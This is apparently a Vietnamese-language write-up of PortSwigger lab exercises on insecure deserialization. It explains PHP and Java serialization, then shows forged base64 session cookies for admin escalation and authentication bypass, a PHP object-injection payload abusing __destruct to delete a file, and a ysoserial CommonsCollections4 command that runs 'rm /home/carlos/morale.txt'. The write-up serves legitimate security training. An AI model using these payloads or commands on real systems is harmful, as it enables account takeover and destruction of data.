# Insecure deserialization

![img1](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-01.png?raw=true)

## What is serialization?

- Tuần tự hóa là quá trình chuyển đổi các cấu trúc dữ liệu phức tạp, chẳng hạn như các đối tượng và trường của chúng, thành định dạng `flatter` hơn, có thể được gửi và nhận dưới dạng luồng byte tuần tự. Tuần tự hóa dữ liệu giúp đơn giản hơn nhiều để:

  - Ghi dữ liệu phức tạp vào bộ nhớ liên tiến trình, tệp hoặc cơ sở dữ liệu

  - Gửi dữ liệu phức tạp, ví dụ, qua mạng, giữa các thành phần khác nhau của ứng dụng hoặc trong lệnh gọi API

  - Điều quan trọng là khi tuần tự hóa một đối tượng, trạng thái của nó cũng được duy trì. Nói cách khác, các thuộc tính của đối tượng được bảo toàn, cùng với các giá trị được gán cho chúng

## Serialization vs deserialization

- Giải tuần tự hóa là quá trình khôi phục luồng byte này thành bản sao đầy đủ chức năng của đối tượng gốc, ở trạng thái chính xác như khi nó được tuần tự hóa. Logic của trang web sau đó có thể tương tác với đối tượng giải tuần tự hóa này, giống như với bất kỳ đối tượng nào khác.

![img2](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-02.png?raw=true)

- Nhiều ngôn ngữ lập trình cung cấp hỗ trợ gốc cho tuần tự hóa. Chính xác cách tuần tự hóa đối tượng phụ thuộc vào ngôn ngữ. Một số ngôn ngữ tuần tự hóa đối tượng thành định dạng nhị phân, trong khi những ngôn ngữ khác sử dụng các định dạng chuỗi khác nhau, với các mức độ dễ đọc khác nhau của con người. Lưu ý rằng tất cả các thuộc tính của đối tượng gốc được lưu trữ trong luồng dữ liệu tuần tự hóa, bao gồm bất kỳ trường `private` nào. Để ngăn một trường được tuần tự hóa, trường đó phải được đánh dấu rõ ràng là `transient` trong khai báo lớp.

- Xin lưu ý rằng khi làm việc với các ngôn ngữ lập trình khác nhau, tuần tự hóa có thể được gọi là marshalling (Ruby) hoặc pickling (Python). Các thuật ngữ này đồng nghĩa với "tuần tự hóa" trong ngữ cảnh này.

## What is insecure deserialization?

- Insecure deserialization là khi dữ liệu do người dùng kiểm soát được giải tuần tự hóa bởi một trang web. Điều này có khả năng cho phép kẻ tấn công thao túng các đối tượng được tuần tự hóa để chuyển dữ liệu có hại vào mã ứng dụng.

- Thậm chí có thể thay thế một đối tượng được tuần tự hóa bằng một đối tượng của một lớp hoàn toàn khác. Đáng báo động là các đối tượng của bất kỳ lớp nào có sẵn trên trang web sẽ được giải tuần tự hóa và khởi tạo, bất kể lớp nào được mong đợi. Vì lý do này, insecure deserialization đôi khi được gọi là lỗ hổng `"object injection"`.

## What is the impact of insecure deserialization?

Tác động của `insecure deserialization` có thể rất nghiêm trọng vì nó cung cấp điểm vào cho bề mặt tấn công tăng mạnh. Nó cho phép kẻ tấn công sử dụng lại mã ứng dụng hiện có theo những cách có hại, dẫn đến nhiều lỗ hổng khác, thường là thực thi mã từ xa.

Ngay cả trong trường hợp không thể thực thi mã từ xa, việc giải tuần tự hóa không an toàn vẫn có thể dẫn đến leo thang đặc quyền, truy cập tệp tùy ý và tấn công từ chối dịch vụ.

## How to exploit insecure deserialization vulnerabilities

### PHP

> PHP serialization format

- PHP sử dụng định dạng `human-readable` như con người có thể đọc được, với các chữ cái biểu thị kiểu dữ liệu và các số biểu thị độ dài của mỗi mục nhập. Ví dụ: hãy xem xét một đối tượng `User` với các thuộc tính:

  ```
  $user->name = "carlos";
  $user->isLoggedIn = true;
  ```

- Để tuần tự hóa đối tượng `User` này ta có thể sử dụng hàm `serialize` , bạn có thể tìm hiểu kĩ hơn về hàm này ở [https://www.php.net/manual/en/function.serialize.php](https://www.php.net/manual/en/function.serialize.php)

```
<?php
class User {
    public $name;
    public $isLoggedIn;
}
$user = new User();
$user->name = "Carlos";
$user->isLoggedIn = true;
// Serialize Object User
$serializedUser = serialize($user);
echo "Serialized User: " . $serializedUser;
?>
```

- Sau khi `serialize` chúng ta nhận được một chuỗi như sau: `O:4:"User":2:{s:4:"name";s:6:"Carlos";s:10:"isLoggedIn";b:1;}`

  ![img3](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-03.png?raw=true)

- Ở đây chúng ta có thể hiểu cái chuỗi trên như sau:

```
O:4:"User"- Một đối tượng có kiểu dữ liệu là **Object** tên lớp gồm 4 ký tự"User"
2- đối tượng có 2 thuộc tính
s:4:"name"- Khóa của thuộc tính đầu tiên là chuỗi 4 ký tự "name"
s:6:"carlos"- Giá trị của thuộc tính đầu tiên là chuỗi 6 ký tự "carlos"
s:10:"isLoggedIn"- Khóa của thuộc tính thứ hai là chuỗi 10 ký tự "isLoggedIn"
b:1- Giá trị của thuộc tính thứ hai là giá trị boolean true
```

### Java

> Java serialization format

Một số ngôn ngữ, chẳng hạn như Java, sử dụng định dạng tuần tự hóa nhị phân. Điều này khó đọc hơn so với việc tuần tự hóa dạng chuỗi như ở trong PHP, nhưng bạn vẫn có thể xác định dữ liệu tuần tự hóa nếu bạn biết cách nhận ra một số dấu hiệu nhận biết. Ví dụ, các đối tượng Java tuần tự hóa luôn bắt đầu bằng cùng một byte, được mã hóa theo `ac ed` trong hệ thập lục phân và `rO0` trong Base64.

Bất kỳ lớp nào triển khai giao diện `java.io.Serializable` đều có thể được tuần tự hóa và hủy tuần tự hóa. Nếu bạn có quyền truy cập mã nguồn, hãy lưu ý bất kỳ mã nào sử dụng phương thức `readObject()`, được sử dụng để đọc và hủy tuần tự hóa dữ liệu từ một `InputStream`.

## Manipulating serialized objects

Khai thác một số lỗ hổng deserialization có thể dễ dàng như thay đổi một thuộc tính trong một đối tượng được tuần tự hóa. Khi trạng thái đối tượng được duy trì, bạn có thể nghiên cứu dữ liệu được tuần tự hóa để xác định và chỉnh sửa các giá trị thuộc tính thú vị. Sau đó, bạn có thể chuyển đối tượng độc hại vào trang web thông qua quá trình deserialization của nó. Đây là bước đầu tiên cho một khai thác deserialization cơ bản.

Nói chung, có hai cách tiếp cận bạn có thể thực hiện khi thao tác với các đối tượng được tuần tự hóa. Bạn có thể chỉnh sửa đối tượng trực tiếp ở dạng luồng byte của nó hoặc bạn có thể viết một tập lệnh ngắn bằng ngôn ngữ tương ứng để tự tạo và sắp xếp theo thứ tự đối tượng mới. Cách tiếp cận thứ hai thường dễ dàng hơn khi làm việc với các định dạng tuần tự hóa nhị phân.

## Modifying object attributes

Khi can thiệp vào dữ liệu, miễn là kẻ tấn công giữ nguyên một đối tượng tuần tự hóa hợp lệ thì quá trình giải tuần tự hóa sẽ tạo ra một đối tượng phía máy chủ với các giá trị thuộc tính đã sửa đổi.

Một ví dụ đơn giản, hãy xem xét một trang web sử dụng đối tượng `User` đã được tuần tự hóa để lưu trữ dữ liệu về phiên của người dùng trong cookie. Nếu kẻ tấn công phát hiện đối tượng tuần tự hóa này trong yêu cầu HTTP, chúng có thể giải mã nó để tìm luồng byte sau:

```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

Thuộc tính `isAdmin` là một điểm đáng chú ý rõ ràng. Kẻ tấn công có thể chỉ cần thay đổi giá trị boolean từ 0(false) thành 1(true), mã hóa lại đối tượng và ghi đè `cookie` hiện tại của chúng bằng giá trị đã sửa đổi này. Riêng biệt, điều này không có tác dụng. Tuy nhiên, giả sử trang web sử dụng cookie này để kiểm tra xem người dùng hiện tại có quyền truy cập vào một số chức năng quản trị nhất định hay không:

```
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```

Mã tấn công này sẽ khởi tạo một đối tượng `User` dựa trên dữ liệu từ cookie, bao gồm thuộc tính `isAdmin` được kẻ tấn công sửa đổi. Không có thời điểm nào tính xác thực của đối tượng được tuần tự hóa được kiểm tra. Dữ liệu này sau đó được chuyển vào câu lệnh có điều kiện và, trong trường hợp này, sẽ cho phép leo thang đặc quyền dễ dàng(từ user -> admin)

> Lab: Modifying serialized objects

Đọc mô tả của lab

![img4](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-04.png?raw=true)

Vậy bây giờ để solve được bài lab này chúng ta cần làm hai việc đó là leo thang đặc quyền lấy quyền quản trị và xóa người dùng `carlos`

Đăng nhập vào lab với username và password được đề bài cung cấp là `wiener:peter`

Tôi sẽ dùng luôn `burpsuite` để tiện cho việc chỉnh sửa các http header(nếu phải sửa)

![img05](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-05.png?raw=true)

Ta có thể thấy chuỗi đã cookie thực chất là một chuỗi base64 được mã hóa để ẩn đi dấu `=` bằng `%3d`

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

Giải mã chuỗi đó với base64 ta thu được

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Đơn giản hơn bạn có thể nhìn ngay sang mục `Inspector` có thể thấy tất cả điều đó

![img6](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-06.png?raw=true)

- Đây chính là quá trình serialize một đối tượng user và sử dụng cơ chế phiên dựa trên tuần tự hóa -> leo thang đặc quyền

- Để leo thang đặc quyền ta cần sửa đổi thuộc tính admin của đối tượng user từ false thành true

- Tôi sẽ sửa trực tiếp ở phần `Inspector`

  ![img7](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-07.png?raw=true)

  ```
  Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
  ```

- Thay thế giá trị cookie mới -> admin

- Lúc này một tab mới xuất hiện `admin panel` chỉ dành cho người admin -> leo thang thành công

  ![img8](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-08.png?raw=true)

- Cuối cùng xóa người dùng `carlos` để hoàn thành lab

  ![img9](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-9.png?raw=true)

  ![img10](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwiggers/Insecure-Deserialization/images/image-10.png?raw=true)

## Modifying data types

Chúng ta đã thấy cách bạn có thể sửa đổi các giá trị thuộc tính trong các đối tượng được tuần tự hóa, nhưng cũng có thể cung cấp các kiểu dữ liệu không mong muốn.

Chúng ta đã thấy cách bạn có thể sửa đổi các giá trị thuộc tính trong các đối tượng được tuần tự hóa, nhưng cũng có thể cung cấp các kiểu dữ liệu không mong muốn.

Logic dựa trên PHP đặc biệt dễ bị thao túng theo kiểu này do hành vi của toán tử so sánh lỏng lẻo `(==)` khi so sánh các kiểu dữ liệu khác nhau. Ví dụ, nếu bạn thực hiện so sánh lỏng lẻo giữa một số nguyên và một chuỗi, PHP sẽ cố gắng chuyển đổi chuỗi thành một số nguyên, nghĩa là 5 == "5" => true.

Điều bất thường là điều này cũng có tác dụng với bất kỳ chuỗi chữ số nào bắt đầu bằng một số. Trong trường hợp này, PHP sẽ chuyển đổi hiệu quả toàn bộ chuỗi thành giá trị số nguyên dựa trên số ban đầu. Phần còn lại của chuỗi bị bỏ qua hoàn toàn. Do đó, 5 == "5 of something" trên thực tế được coi là 5 == 5.

Điều này trở nên kỳ lạ hơn khi so sánh một chuỗi với số nguyên 0:

`0 == "Example string" // true`

> Tại sao? Bởi vì không có số nào, tức là không có 0 chữ số trong chuỗi. PHP coi toàn bộ chuỗi này là số nguyên 0.

Hãy xem xét trường hợp toán tử so sánh lỏng lẻo này được sử dụng kết hợp với dữ liệu do người dùng kiểm soát từ một đối tượng được giải tuần tự hóa. Điều này có khả năng dẫn đến các [lỗi logic](https://portswigger.net/web-security/logic-flaws) nguy hiểm .

```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

Giả sử kẻ tấn công đã sửa đổi thuộc tính mật khẩu để nó chứa số nguyên 0 thay vì chuỗi mong đợi. Miễn là mật khẩu được lưu trữ không bắt đầu bằng số, điều kiện sẽ luôn trả về true, cho phép bỏ qua xác thực. Lưu ý rằng điều này chỉ có thể thực hiện được vì quá trình giải tuần tự hóa bảo toàn kiểu dữ liệu. Nếu mã lấy mật khẩu trực tiếp từ yêu cầu, thì 0 sẽ được chuyển đổi thành chuỗi và điều kiện sẽ đánh giá thành false.

Xin lưu ý rằng khi sửa đổi các kiểu dữ liệu trong bất kỳ định dạng đối tượng tuần tự hóa nào, điều quan trọng là phải nhớ cập nhật bất kỳ nhãn kiểu và chỉ báo độ dài nào trong dữ liệu tuần tự hóa. Nếu không, đối tượng tuần tự hóa sẽ bị hỏng và sẽ không được giải tuần tự hóa.

> Lab: Modifying serialized data types

Cũng tương tự tiến hành đăng nhập với tài khoản được cung cấp `wiener:peter`

Kiểm tra cookie và tiến hành decode với base64

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ6aWtnaWUwZmljY3Ixcnl6OWVxa2Fqamc5MXB2NWs4eCI7fQ==

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zikgie0ficcr1ryz9eqkajjg91pv5k8x";}
```

Vì cần phải đăng nhập bằng `administrator` nên chắc chắn thuộc tính `username` của đối tượng `user` sẽ phải mang giá `administrator` và độ dài từ 6 lên 13, đổi mã `access_token` thành 0

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

Tại sao lại đổi giá trị của chuỗi `access_token` thành 0 và thay đổi kiểu dữ liệu thành `i(int)` do lợi dụng cơ chế so sánh lỏng lẻo của php như sau:

```
<?php
  $i = 0;
  $s = "zikgie0ficcr1ryz9eqkajjg91pv5k8x";
  echo ($i == $s); ## 1
?>
```

Encode chuỗi trên với base64

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

## Using application functionality

Ngoài việc chỉ kiểm tra các giá trị thuộc tính, chức năng của trang web cũng có thể thực hiện các hoạt động nguy hiểm trên dữ liệu từ một đối tượng đã giải tuần tự hóa. Trong trường hợp này, bạn có thể sử dụng giải tuần tự hóa để truyền dữ liệu không mong muốn và tận dụng chức năng liên quan để gây ra thiệt hại.

Ví dụ, như một phần của chức năng "Xóa người dùng" của trang web, ảnh hồ sơ của người dùng sẽ bị xóa bằng cách truy cập đường dẫn tệp trong thuộc tính `$user->image_location`. Nếu $user này được tạo từ một đối tượng đã giải tuần tự hóa, kẻ tấn công có thể khai thác điều này bằng cách truyền vào một đối tượng đã sửa đổi với `image_location` được đặt thành một đường dẫn tệp tùy ý. Việc xóa tài khoản người dùng của chính họ sau đó cũng sẽ xóa tệp tùy ý này.

> Lab: Using application functionality to exploit insecure deserialization

Trang web có chức năng xóa tài khoản , sau khi đăng nhập tài khoản tôi nhận được một chuỗi base64 và quen thuộc giải mã nó ra

![img11]()

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ngbl8yyouvv7p7r4yjt5xcnor5zczvxu";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

Đề bài yêu cầu xóa file `morale.txt` của người dùng `carlos` trong thư mục `home` , thay đổi như sau:

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"tdc91fdaz6421i3o9sqpgz8cf7v1zxqh";s:11:"avatar_link";s:23:"/home/carlos/morale.txt"}

Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0ZGM5MWZkYXo2NDIxaTNvOXNxcGd6OGNmN3YxenhxaCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0In0=
```

Tôi vô tình xóa mất account `wiener` nên tôi sẽ sử dụng tài khoản backup `gregg:rosebud`

Ví dụ này dựa vào kẻ tấn công tự động gọi phương thức nguy hiểm thông qua chức năng mà người dùng có thể truy cập. Tuy nhiên, việc giải tuần tự hóa không an toàn trở nên thú vị hơn nhiều khi bạn tạo ra các khai thác tự động truyền dữ liệu vào các phương thức nguy hiểm. Điều này được kích hoạt bằng cách sử dụng `"magic methods"`.

## Magic methods

`Magic methods` là một tập hợp con đặc biệt của các phương thức mà bạn không cần phải gọi một cách rõ ràng. Thay vào đó, chúng được gọi tự động bất cứ khi nào một sự kiện hoặc tình huống cụ thể xảy ra. `Magic methods` là một tính năng phổ biến của lập trình hướng đối tượng trong nhiều ngôn ngữ khác nhau. Đôi khi chúng được biểu thị bằng cách thêm tiền tố hoặc dấu gạch dưới kép vào tên phương thức.

Các nhà phát triển có thể thêm `Magic methods` vào một `class` để xác định trước mã nào sẽ được thực thi khi sự kiện hoặc tình huống tương ứng xảy ra. Thời điểm và lý do chính xác để gọi `Magic methods` khác nhau tùy theo từng phương thức. Một trong những ví dụ phổ biến nhất trong PHP là `__construct()`, được gọi bất cứ khi nào một đối tượng của `class` được khởi tạo, tương tự như `__init__` của Python. Thông thường, các `Magic methods` của chương trình xây dựng như thế này chứa mã để khởi tạo các thuộc tính của lớp thể hiện nó. Tuy nhiên, các nhà phát triển có thể tùy chỉnh các `Magic methods` để thực thi bất kỳ mã nào họ muốn.

`Magic methods` được sử dụng rộng rãi và bản thân chúng không phải là lỗ hổng. Nhưng chúng có thể trở nên nguy hiểm khi mã mà chúng thực thi xử lý dữ liệu có thể bị kiểm soát bởi kẻ tấn công. Ví dụ, từ một `deserialized object` , kẻ tấn công có thể khai thác điều này để tự động gọi các phương thức trên dữ liệu đã giải tuần tự hóa khi các điều kiện tương ứng được đáp ứng.

Quan trọng nhất trong bối cảnh này, một số ngôn ngữ có các `magic method` được gọi tự động trong quá trình giải tuần tự hóa. Ví dụ, phương thức `unserialize()` của PHP tìm kiếm và gọi `magic method __wakeup()` của đối tượng.

Trong giải tuần tự hóa Java, điều tương tự cũng áp dụng cho phương thức `ObjectInputStream.readObject()`, được sử dụng để đọc dữ liệu từ luồng byte ban đầu và về cơ bản hoạt động như một hàm tạo để "khởi tạo lại" một đối tượng đã tuần tự hóa. Tuy nhiên, các lớp `Serializable` cũng có thể khai báo phương thức `readObject()` của riêng chúng như sau:

```
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```

Phương thức `readObject()` được khai báo theo đúng cách này hoạt động như một `magic method` được gọi trong quá trình giải tuần tự hóa. Điều này cho phép lớp kiểm soát quá trình giải tuần tự hóa các trường của chính nó chặt chẽ hơn.

Bạn nên chú ý đến bất kỳ lớp nào chứa các loại `magic methods` này. Chúng cho phép bạn truyền dữ liệu từ một đối tượng được tuần tự hóa vào mã của trang web trước khi đối tượng được giải tuần tự hóa hoàn toàn. Đây là điểm khởi đầu để tạo ra các khai thác nâng cao hơn.

## Injecting arbitrary objects

Như chúng ta đã thấy, đôi khi có thể khai thác quá trình giải tuần tự hóa không an toàn chỉ bằng cách chỉnh sửa đối tượng do trang web cung cấp. Tuy nhiên, việc chèn các loại đối tượng tùy ý có thể mở ra nhiều khả năng hơn nữa.

Trong lập trình hướng đối tượng, các phương thức khả dụng cho một đối tượng được xác định bởi lớp của đối tượng đó. Do đó, nếu kẻ tấn công có thể thao túng lớp đối tượng nào đang được truyền vào dưới dạng dữ liệu tuần tự hóa, chúng có thể tác động đến mã nào được thực thi sau và thậm chí trong quá trình giải tuần tự hóa.

Các phương thức giải tuần tự hóa thường không kiểm tra những gì chúng đang giải tuần tự hóa. Điều này có nghĩa là bạn có thể truyền vào các đối tượng của bất kỳ lớp tuần tự hóa nào có sẵn cho trang web và đối tượng sẽ được giải tuần tự hóa. Điều này cho phép kẻ tấn công tạo các phiên bản của các lớp tùy ý. Thực tế là đối tượng này không thuộc lớp mong đợi không thành vấn đề. Loại đối tượng không mong muốn có thể gây ra ngoại lệ trong logic ứng dụng, nhưng đối tượng độc hại sẽ được khởi tạo vào thời điểm đó.

Nếu kẻ tấn công có quyền truy cập vào mã nguồn, chúng có thể nghiên cứu chi tiết tất cả các lớp khả dụng. Để xây dựng một khai thác đơn giản, họ sẽ tìm kiếm các lớp chứa các `magic methods` khử tuần tự hóa, sau đó kiểm tra xem có lớp nào trong số chúng thực hiện các hoạt động nguy hiểm trên dữ liệu có thể kiểm soát được hay không. Sau đó, kẻ tấn công có thể truyền vào một đối tượng được tuần tự hóa của lớp này để sử dụng `magic methods` của nó cho một khai thác.

> Lab: Arbitrary object injection in PHP

Vẫn đăng nhập với username và password quen thuộc

![img12]()

Chú ý phần `site map` của `target`

![img13]()

```
GET /libs/CustomTemplate.php HTTP/2
Host: 0a1800e2035f848b8022df5400c50063.web-security-academy.net
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

- Đây là một yêu cầu `HTTP GET` được gửi đến `server` để tải tài nguyên `CustomTemplate.php` từ đường dẫn `/libs/CustomTemplate.php`

- Khi chúng ta thêm `~` vào đăng sau `URL request` sẽ thấy được file `backup`. Một số hệ điều hành và phần mềm soạn thảo (như `vim, emacs`, hoặc thậm chí các trình biên tập văn bản cũ hơn) tự động tạo file `backup` với dấu `~` ở cuối tên file khi chúng chỉnh sửa hoặc lưu lại các tệp tin.

- Khi bạn yêu cầu tệp `CustomTemplate.php~`, bạn có thể đang truy cập vào tệp `backup` này mà server không xử lý dưới dạng mã PHP. Kết quả là trình duyệt có thể hiển thị mã nguồn thô của file PHP, vì file backup không được chạy mà được gửi đi như một tài liệu văn bản thuần túy.

  ![img14]()

```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

- Giải thích code:

  - Lớp `CustomTemplate`: Lớp này định nghĩa một đối tượng dùng để quản lý các template, bao gồm việc đọc, ghi và khóa template.

  - `$template_file_path`: Biến này lưu trữ đường dẫn của file template mà đối tượng CustomTemplate sẽ thao tác.

  - `$lock_file_path`: Biến này lưu trữ đường dẫn của file khóa tương ứng với template. File khóa sẽ có cùng tên với file template nhưng thêm phần mở rộng .lock.

  - Hàm khởi tạo `__construct`

  - Hàm `isTemplateLocked` kiểm tra xem file `template` có bị khóa hay không. `file_exists($this->lock_file_path);`: Hàm `file_exists()` sẽ trả về `true` nếu file khóa tồn tại và `false` nếu không. Nếu file khóa tồn tại, điều đó có nghĩa là template đang bị khóa.
  - Hàm `getTemplate`: Hàm này đọc nội dung của file template và trả về nội dung đó.
  - Hàm `saveTemplate`:
    - Hàm này cho phép lưu nội dung mới vào file template nếu template không bị khóa.
    - `if (!isTemplateLocked()) {`: Kiểm tra xem template có bị khóa không. Nếu không bị khóa (nghĩa là `isTemplateLocked()` trả về false), thì cho phép ghi file.
    - `file_put_contents($this->lock_file_path, "")`: Tạo một file khóa trống (không chứa dữ liệu) với đường dẫn `$this->lock_file_path`. Nếu không thể tạo file khóa, chương trình ném ra một ngoại lệ (throw new Exception)
    - `file_put_contents($this->template_file_path, $template)`: Ghi nội dung template mới vào file template. Nếu việc ghi thất bại, ném ra ngoại lệ
    - Hàm `__destruct`: Đây là phương thức hủy (destructor) của lớp `CustomTemplate`. Phương thức này được gọi khi một đối tượng từ lớp này bị hủy. Trong phương thức hủy này, nếu tệp khóa tồn tại, nó sẽ được xóa bằng cách sử dụng hàm `unlink()`.

  Vì vậy chúng ta sẽ lợi dụng `magic method` `__destruct` để xóa file của người dùng `carlos`

  ```
  O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
  TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d
  ```

  ![img15]()

  Lấy chuỗi base64 mới và chỉnh sửa `cookie` để solve bài lab

## Gadget chains

`Gadget` là một đoạn mã có trong ứng dụng có thể giúp kẻ tấn công đạt được mục tiêu cụ thể. Một `Gadget` riêng lẻ có thể không trực tiếp gây hại cho dữ liệu đầu vào của người dùng. Tuy nhiên, mục tiêu của kẻ tấn công có thể chỉ là gọi một phương thức sẽ truyền dữ liệu đầu vào của chúng vào một `Gadget` khác. Bằng cách liên kết nhiều `Gadget` với nhau theo cách này, kẻ tấn công có khả năng truyền dữ liệu đầu vào của chúng vào một `sink gadget` nguy hiểm, nơi có thể gây ra thiệt hại tối đa.

Điều quan trọng là phải hiểu rằng, không giống như một số loại khai thác khác, `gagget chains` không phải là tải trọng của các phương thức được liên kết do kẻ tấn công xây dựng. Tất cả mã đã tồn tại trên trang web. Điều duy nhất mà kẻ tấn công kiểm soát là dữ liệu được truyền vào `gagget chains`. Điều này thường được thực hiện bằng cách sử dụng một `magic method` được gọi trong quá trình giải tuần tự hóa, đôi khi được gọi là `kick-off gadget`.

## Working with pre-built gadget chains

Việc xác định thủ công các `gadget chains` có thể là một quá trình khá gian nan và gần như không thể thực hiện được nếu không có quyền truy cập vào mã nguồn. May mắn thay, có một số tùy chọn để làm việc với các `gadget chains` được xây dựng sẵn mà bạn có thể thử trước.

Có một số công cụ có sẵn cung cấp một loạt các chuỗi được phát hiện trước đã được khai thác thành công trên các trang web khác. Ngay cả khi bạn không có quyền truy cập vào mã nguồn, bạn vẫn có thể sử dụng các công cụ này để xác định và khai thác các lỗ hổng giải tuần tự hóa không an toàn với tương đối ít nỗ lực. Cách tiếp cận này khả thi do việc sử dụng rộng rãi các thư viện chứa các `gadget chains` có thể khai thác. Ví dụ: nếu một chuỗi tiện ích trong thư viện `Apache Commons Collections` của `Java` có thể bị khai thác trên một trang web, thì bất kỳ trang web nào khác triển khai thư viện này cũng có thể bị khai thác bằng cùng một chuỗi.

[ysoserial](https://github.com/frohoff/ysoserial)

Một tool về `Java deserialization` là `ysoserial`. Công cụ này cho phép bạn chọn một trong các `gadget chains` được cung cấp cho một thư viện mà bạn nghĩ ứng dụng mục tiêu đang sử dụng, sau đó truyền vào một lệnh mà bạn muốn thực thi. Sau đó, nó tạo ra một đối tượng tuần tự hóa phù hợp dựa trên chuỗi đã chọn. Điều này vẫn liên quan đến một lượng thử nghiệm và sai sót nhất định, nhưng ít tốn công sức hơn đáng kể so với việc tự xây dựng `gadget chains` của riêng bạn theo cách thủ công.

```
Chú ý:
Trong Java phiên bản 16 trở lên, bạn cần thiết lập một loạt các đối số dòng lệnh để **Java** chạy ysoserial. Ví dụ:
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
```

> Lab: Exploiting Java deserialization with Apache Commons

![img16]()

Ứng dụng này sử dụng thư viện `Java` là `Apache Commons Collections` vì vậy có thể sử dụng `CommonsCollections4` là một `gadget` của `ysoserial` để khai thác `deserialization`

```
└─$ java  \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar  CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > cookieToUse.txt
```

```
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh
cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u
cy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjM
AgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv
Y29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0
